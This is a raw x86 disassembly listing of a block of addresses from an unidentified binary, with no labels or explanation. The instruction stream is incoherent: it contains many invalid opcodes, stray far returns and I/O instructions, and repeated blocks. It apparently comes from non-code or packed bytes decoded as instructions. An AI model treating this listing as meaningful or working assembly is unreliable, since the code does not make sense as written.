  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
